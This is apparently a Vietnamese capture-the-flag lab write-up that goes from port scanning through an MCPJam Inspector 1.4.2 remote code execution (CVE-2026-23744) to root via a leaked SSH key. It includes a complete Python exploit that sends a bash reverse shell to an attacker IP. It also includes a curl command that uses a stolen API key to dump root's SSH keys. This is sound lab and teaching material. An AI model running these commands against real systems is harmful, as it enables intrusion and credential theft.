

# Lời nói đặc biệt
Đây là bài lab cấp medium đầu tiên tôi từng làm




# Véc tơ tấn công
mcp-dev: Nmap -> Web-Enumeration -> mcpjam 1.4.2 -> reverse shell

analyst: System Enumeration -> port 8888 runs jupyter notebooks  + token -> port forwarding -> login -> python code injection -> reverse shell

root: System Enumeration -> opsmcp_key -> rsa key stored at localhost:5000 -> python server.py code analyst -> dump rsa_key -> ssh -> shell as root



# Nmap 
![[Pasted image 20261017222700.png]]


- Nhận xét về host:
	- cổng 22 SSH không làm được gì
	- cổng 80 HTTP đang chạy nginx với host server là ubuntu và có DNS devhub.htb
	- cổng 6274 đang mở nhưng không biết chạy dịch vụ gì


Lưu host vào

![[Pasted image 20261017222910.png]]


trang devhub.htb
![[Pasted image 20261017223202.png]]


Có vẻ khi vào trang này chúng ta thấy rõ rằng cổng 6274 đang chạy mcp

![[Pasted image 20261017223340.png]]


![[Pasted image 20261017223436.png]]

có vẻ trang web này đang chạy MCPjam version 1.4.2


Có 1 lỗ hổng CVE-2026-23744 cho phép chúng ta thực hiện RCE trên trang web này và có thể dùng để có được reverse shell


```python
# Exploit Title: MCPJam Inspector - Remote Code Execution 
# Date: 07/03/2026
# Exploit Author: Diamorphine
# Vendor Homepage: https://www.mcpjam.com/
# Software Link: https://github.com/MCPJam
# Version: <=1.4.2
# Tested on: Debian
# CVE : CVE-2026-23744


import asyncio
import httpx
import argparse
from urllib.parse import urljoin


async def main(attacker_ip, attacker_port, url):
    async with httpx.AsyncClient(verify=False) as client:
        data = {
            "serverConfig": {
                "command": "bash",
                "args": ["-c", f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"],
                "env": {}
            },
            "serverId": "Hello666"
        }
        
        ready_url = urljoin(url, "/api/mcp/connect")
        r = await client.post(url=ready_url, json=data)
        print(r.text)

parser = argparse.ArgumentParser(description="Exploit for CVE-2026-23744 MCPJam Inspector - Remote Code Execution")

parser.add_argument("-u", "--url", required=True, help="Target host. e.g. http://127.0.0.1:8080")
parser.add_argument("-l", "--lhost", required=True, help="Attacker ip")
parser.add_argument("-p", "--lport", required=True, help="Attacker port")

args = parser.parse_args()

if __name__ == '__main__':
    asyncio.run(main(args.lhost, args.lport, args.url))
```

về cơ  bản bạn tiêm vào api /api/mcp/connect với POST request chứa data trên thì sẽ trả về shell

# shell as mcp-dev

![[Pasted image 20261017224302.png]]

sử dụng script trên thì về cơ bản đã có được shell của mcp-dev


![[Pasted image 20261017224948.png]]

hmm chúng ta có token


và cổng 8888 đang mở Jupyter notebook
![[Pasted image 20261017225046.png]]

Port forwarding về máy
![[Pasted image 20261017230019.png]]



truy cập vào ![[Pasted image 20261017230258.png]]

sử dụng token ở trên t vào được jupyter notebook environment của user analyst

![[Pasted image 20261017230652.png]]


# Shell as Analyst
inject command we have the shell![[Pasted image 20261017230852.png]]

chúng ta đọc được mã nguồn /opt/opsmcp/server.py và về cơ bản chúng ta có thể đọc được root rsa key được lưu ở cổng 5000 localhost với cái API /tools/call bằng POST request và key đã có
![[Pasted image 20261017231939.png]]



```bash
curl -H "X-API-Key: $(cat ~/.opsmcp_key)" \ -X POST http://127.0.0.1:5000/tools/call \ -H "Content-Type: application/json" \ -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```


# Shell as root

sử dụng câu lệnh trên chúng ta sẽ có key rsa của root
![[Pasted image 20261017232214.png]]

và chúng ta có root
![[Pasted image 20261017232447.png]]